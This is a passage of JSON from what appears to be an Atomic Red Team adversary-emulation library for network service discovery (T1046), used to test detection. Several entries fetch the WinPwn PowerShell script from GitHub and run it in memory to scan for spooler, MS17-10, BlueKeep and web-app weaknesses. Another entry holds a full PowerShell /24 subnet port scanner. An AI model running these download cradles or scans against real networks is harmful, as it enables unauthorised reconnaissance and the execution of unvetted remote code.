                        "input_arguments": {
                            "host_ip": {
                                "description": "Host to scan.",
                                "type": "string",
                                "default": "127.0.0.1"
                            },
                            "filename": {
                                "description": "Location of the project file",
                                "type": "path",
                                "default": "PathToAtomicsFolder\\T1046\\src\\T1046.py"
                            }
                        },
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "Check if python exists on the machine\n",
                                "prereq_command": "if (Get-Command py -errorAction SilentlyContinue) { exit 0 } else { exit 1 }\n",
                                "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null\ninvoke-webrequest \"https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\python_setup.exe\"\nStart-Process -FilePath \"PathToAtomicsFolder\\..\\ExternalPayloads\\python_setup.exe\" -ArgumentList \"/quiet InstallAllUsers=1 PrependPath=1 Include_test=0\" -Wait\n"
                            }
                        ],
                        "executor": {
                            "command": "python \"#{filename}\" -i #{host_ip}\n",
                            "name": "powershell"
                        }
                    },
                    {
                        "name": "WinPwn - spoolvulnscan",
                        "auto_generated_guid": "54574908-f1de-4356-9021-8053dd57439a",
                        "description": "Start MS-RPRN RPC Service Scan using spoolvulnscan function of WinPwn",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nspoolvulnscan -noninteractive -consoleoutput",
                            "name": "powershell"
                        }
                    },
                    {
                        "name": "WinPwn - MS17-10",
                        "auto_generated_guid": "97585b04-5be2-40e9-8c31-82157b8af2d6",
                        "description": "Search for MS17-10 vulnerable Windows Servers in the domain using powerSQL function of WinPwn",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nMS17-10 -noninteractive -consoleoutput",
                            "name": "powershell"
                        }
                    },
                    {
                        "name": "WinPwn - bluekeep",
                        "auto_generated_guid": "1cca5640-32a9-46e6-b8e0-fabbe2384a73",
                        "description": "Search for bluekeep vulnerable Windows Systems in the domain using bluekeep function of WinPwn. Can take many minutes to complete (~600 seconds in testing on a small domain).",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nbluekeep -noninteractive -consoleoutput",
                            "name": "powershell"
                        }
                    },
                    {
                        "name": "WinPwn - fruit",
                        "auto_generated_guid": "bb037826-cbe8-4a41-93ea-b94059d6bb98",
                        "description": "Search for potentially vulnerable web apps (low hanging fruits) using fruit function of WinPwn",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nfruit -noninteractive -consoleoutput",
                            "name": "powershell"
                        }
                    },
                    {
                        "name": "Network Service Discovery for Containers",
                        "auto_generated_guid": "06eaafdb-8982-426e-8a31-d572da633caa",
                        "description": "Attackers may try to obtain a list of services that are operating on remote hosts and local network infrastructure devices, in order to identify potential vulnerabilities that can be exploited through remote software attacks. They typically use tools to conduct port and vulnerability scans in order to obtain this information.",
                        "supported_platforms": [
                            "containers"
                        ],
                        "dependency_executor_name": "sh",
                        "dependencies": [
                            {
                                "description": "Verify docker is installed.",
                                "prereq_command": "which docker\n",
                                "get_prereq_command": "if [ \"\" == \"`which docker`\" ]; then echo \"Docker Not Found\"; if [ -n \"`which apt-get`\" ]; then sudo apt-get -y install docker ; elif [ -n \"`which yum`\" ]; then sudo yum -y install docker ; fi ; else echo \"Docker installed\"; fi\n"
                            },
                            {
                                "description": "Verify docker service is running.",
                                "prereq_command": "sudo systemctl status docker  --no-pager\n",
                                "get_prereq_command": "sudo systemctl start docker\n"
                            }
                        ],
                        "executor": {
                            "command": "docker build -t t1046 $PathToAtomicsFolder/T1046/src/\ndocker run --name t1046_container --rm -d -t t1046\ndocker exec t1046_container /scan.sh",
                            "cleanup_command": "docker stop t1046_container\ndocker rmi -f t1046",
                            "name": "sh"
                        }
                    },
                    {
                        "name": "Port-Scanning /24 Subnet with PowerShell",
                        "auto_generated_guid": "05df2a79-dba6-4088-a804-9ca0802ca8e4",
                        "description": "Scanning common ports in a /24 subnet. If no IP address for the target subnet is specified the test tries to determine the attacking machine's \"primary\" IPv4 address first and then scans that address with a /24 netmask.\nThe connection attempts to use a timeout parameter in milliseconds to speed up the scan. Please note the atomic might not print any output until the scans are completed.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "ip_address": {
                                "description": "IP-Address within the target subnet. Default is empty and script tries to determine local IP address of attacking machine. A comma separated list of targe IPs is also accepted (useful to simulate a wider scan while only scanning key host e.g., honeypots)",
                                "type": "string",
                                "default": ""
                            },
                            "port_list": {
                                "description": "Comma separated list of ports to scan",
                                "type": "string",
                                "default": "445, 3389"
                            },
                            "timeout_ms": {
                                "description": "Connection timeout in milliseconds",
                                "type": "string",
                                "default": "200"
                            }
                        },
                        "executor": {
                            "command": "$ipAddr = \"#{ip_address}\"\nif ($ipAddr -like \"*,*\") {\n    $ip_list = $ipAddr -split \",\"\n    $ip_list = $ip_list.ForEach({ $_.Trim() })\n    Write-Host \"[i] IP Address List: $ip_list\"\n\n    $ports = #{port_list}\n\n    foreach ($ip in $ip_list) {\n        foreach ($port in $ports) {\n            Write-Host \"[i] Establishing connection to: $ip : $port\"\n            try {\n                $tcp = New-Object Net.Sockets.TcpClient\n                $tcp.ConnectAsync($ip, $port).Wait(#{timeout_ms}) | Out-Null\n            } catch {}\n            if ($tcp.Connected) {\n                $tcp.Close()\n                Write-Host \"Port $port is open on $ip\"\n            }\n        }\n    }\n} elseif ($ipAddr -notlike \"*,*\") {\n    if ($ipAddr -eq \"\") {\n        # Assumes the \"primary\" interface is shown at the top\n        $interface = Get-NetIPInterface -AddressFamily IPv4 -ConnectionState Connected | Select-Object -ExpandProperty InterfaceAlias -First 1\n        Write-Host \"[i] Using Interface $interface\"\n        $ipAddr = Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias $interface | Select-Object -ExpandProperty IPAddress\n    }\n    Write-Host \"[i] Base IP-Address for Subnet: $ipAddr\"\n    $subnetSubstring = $ipAddr.Substring(0, $ipAddr.LastIndexOf('.') + 1)\n    # Always assumes /24 subnet\n    Write-Host \"[i] Assuming /24 subnet. scanning $subnetSubstring'1' to $subnetSubstring'254'\"\n\n    $ports = #{port_list}\n    $subnetIPs = 1..254 | ForEach-Object { \"$subnetSubstring$_\" }\n\n    foreach ($ip in $subnetIPs) {\n        foreach ($port in $ports) {\n            try {\n                $tcp = New-Object Net.Sockets.TcpClient\n                $tcp.ConnectAsync($ip, $port).Wait(#{timeout_ms}) | Out-Null\n            } catch {}\n            if ($tcp.Connected) {\n                $tcp.Close()\n                Write-Host \"Port $port is open on $ip\"\n            }\n        }\n    }\n} else {\n    Write-Host \"[Error] Invalid Inputs\"\n    exit 1\n}",
                            "name": "powershell"
                        }
                    },
                    {
                        "name": "Remote Desktop Services Discovery via PowerShell",
                        "auto_generated_guid": "9e55750e-4cbf-4013-9627-e9a045b541bf",
                        "description": "Availability of remote desktop services can be checked using get- cmdlet of PowerShell\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "Get-Service -Name \"Remote Desktop Services\", \"Remote Desktop Configuration\"\n",
                            "name": "powershell",
                            "elevation_required": true
                        }
                    }
                ]
            }
        ]
    },
    "timestamp": "2025-02-28 11:30:15"
}